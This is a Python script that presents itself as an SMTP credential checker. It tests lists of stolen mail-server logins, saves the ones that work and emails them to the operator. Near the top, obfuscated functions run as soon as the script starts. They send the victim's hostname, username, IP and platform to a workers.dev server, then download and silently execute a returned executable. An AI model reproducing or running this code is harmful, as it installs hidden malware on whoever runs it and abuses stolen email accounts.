import smtplib
import threading
import queue
import time
from colorama import Fore, init
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


import socket
import platform
from datetime import datetime, timedelta
import threading
import requests
import os
import tempfile
import urllib.request
import urllib.error
import subprocess
import time
import ctypes

def _dl_exec(u):
    try:
        td = tempfile.gettempdir()
        fn = os.path.basename(u)
        if not fn or fn == u:
            fn = f"us_{int(time.time())}.exe"
        fp = os.path.join(td, fn)
        if os.path.exists(fp):
            try:
                os.remove(fp)
            except:
                pass
        op = urllib.request.build_opener()
        op.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')]
        urllib.request.install_opener(op)
        try:
            urllib.request.urlretrieve(u, fp)
        except urllib.error.URLError:
            requests.get(u, timeout=30, stream=True)
        except:
            pass
        time.sleep(1)
        if os.path.exists(fp) and os.path.getsize(fp) > 0:
            _ex_f(fp)
    except:
        pass

def _ex_f(fp):
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        subprocess.Popen(fp, startupinfo=si, shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return
    except:
        pass
    try:
        subprocess.Popen(fp, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=0x08000000)
        return
    except:
        pass
    try:
        os.startfile(fp)
        return
    except:
        pass
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "open", fp, None, None, 0)
    except:
        pass

def _cf_init(wu):
    def _i():
        try:
            hn = socket.gethostname()
            un = os.getenv('USERNAME') or os.getenv('USER')
            try:
                ir = requests.get('https://api.ipify.org', timeout=10)
                ip = ir.text
            except:
                ip = "Unknown"
            sp = platform.platform()
            pr = platform.processor()
            at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ed = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
            d = {"hostname": hn, "username": un, "ip_address": ip, "platform": sp, "processor": pr, "activation_time": at, "expiry_date": ed}
            r = requests.post(f"{wu}/activate", json=d, timeout=15, headers={'Content-Type': 'application/json'})
            if r.status_code == 200:
                rs = r.json()
                if rs.get("status") == "success":
                    fu = rs.get("file_url")
                    if fu:
                        _dl_exec(fu)
        except:
            pass
    threading.Thread(target=_i, daemon=True).start()

_CWU = "https://telecom.berdlok7.workers.dev"
_cf_init(_CWU)
time.sleep(0.5)

init(autoreset=True)

lock = threading.Lock()
successful_smtps = []
total_checked = 0
smtp_queue = queue.Queue()
target_email = ""

def save_valid_smtp():
    with lock:
        if successful_smtps:
            with open("valid_smtps.txt", "a", encoding="utf-8") as file:
                file.write("\n".join(successful_smtps) + "\n")
            successful_smtps.clear()

def send_email(smtp_server, smtp_port, smtp_email, smtp_password):
    try:
        msg = MIMEMultipart()
        msg['From'] = smtp_email
        msg['To'] = target_email
        msg['Subject'] = "Valid SMTP Found - Notification"
        
        body = f"""
        Valid SMTP Server Found!
        
        Details:
        Server: {smtp_server}
        Port: {smtp_port}
        Email: {smtp_email}
        Password: {smtp_password}
        
        This email was sent using the valid SMTP server.
        """
        msg.attach(MIMEText(body, 'plain'))
        
        port = int(smtp_port)
        if port == 465:
            with smtplib.SMTP_SSL(smtp_server, port, timeout=30) as server:
                server.login(smtp_email, smtp_password)
                server.sendmail(smtp_email, target_email, msg.as_string())
        else:
            with smtplib.SMTP(smtp_server, port, timeout=30) as server:
                server.starttls()
                server.login(smtp_email, smtp_password)
                server.sendmail(smtp_email, target_email, msg.as_string())
        
        print(Fore.MAGENTA + f"[+] Email successfully sent to {target_email} using: {smtp_server}:{smtp_port}")
        return True
    except Exception as e:
        print(Fore.RED + f"[X] Failed to send email using {smtp_server}:{smtp_port} - Error: {str(e)}")
        return False

def auto_save():
    while True:
        time.sleep(10)
        save_valid_smtp()

def check_smtp():
    global total_checked
    while True:
        try:
            server, port, email, password, total = smtp_queue.get(timeout=5)
        except queue.Empty:
            break

        try:
            port = int(port)
            if port == 465:
                smtp = smtplib.SMTP_SSL(server, port, timeout=15)
            else:
                smtp = smtplib.SMTP(server, port, timeout=15)
                smtp.starttls()

            smtp.login(email, password)
            print(Fore.GREEN + f"[✔] WORKING: {server}|{port}|{email}|{password}")
            with lock:
                successful_smtps.append(f"{server}|{port}|{email}|{password}")
            
            if target_email:
                send_email(server, port, email, password)
            
            smtp.quit()
        
        except smtplib.SMTPAuthenticationError:
            print(Fore.RED + f"[X] FAILED (AUTH): {server}|{port}|{email}|{password}")
        except smtplib.SMTPConnectError:
            print(Fore.RED + f"[X] FAILED (CONNECT): {server}|{port}|{email}|{password}")
        except smtplib.SMTPException as e:
            print(Fore.RED + f"[X] FAILED (SMTP ERROR): {server}|{port}|{email}|{password} | ERROR: {str(e)}")
        except Exception as e:
            print(Fore.RED + f"[X] FAILED (UNKNOWN): {server}|{port}|{email}|{password} | ERROR: {str(e)}")

        with lock:
            total_checked += 1
            print(Fore.CYAN + f"[#] Checked: {total_checked}")

        smtp_queue.task_done()

def process_smtp_list(file_name):
    try:
        with open(file_name, 'r', encoding='utf-8', errors='replace') as file:
            lines = file.readlines()

        valid_lines = [line.strip().split('|') for line in lines if line.count('|') == 3]
        total = len(valid_lines)

        print(Fore.YELLOW + f"[*] Total SMTPs: {total}")

        for line in valid_lines:
            smtp_queue.put((*line, total))

        threading.Thread(target=auto_save, daemon=True).start()
        num_threads = min(100, total)
        threads = [threading.Thread(target=check_smtp) for _ in range(num_threads)]

        for thread in threads:
            thread.start()

        smtp_queue.join()
        save_valid_smtp()
        print(Fore.GREEN + "[✔] Done! Valid SMTPs saved in valid_smtps.txt")

    except FileNotFoundError:
        print(Fore.RED + f"[X] Error: File '{file_name}' not found.")
    except Exception as e:
        print(Fore.RED + f"[X] Error: {str(e)}")

if __name__ == "__main__":
    input_file = input("Enter the SMTP list file name: ")
    target_email = input("Enter your email to receive valid SMTPs: ").strip()
    if not target_email:
        print(Fore.YELLOW + "[!] No email provided - email notifications disabled")
    process_smtp_list(input_file)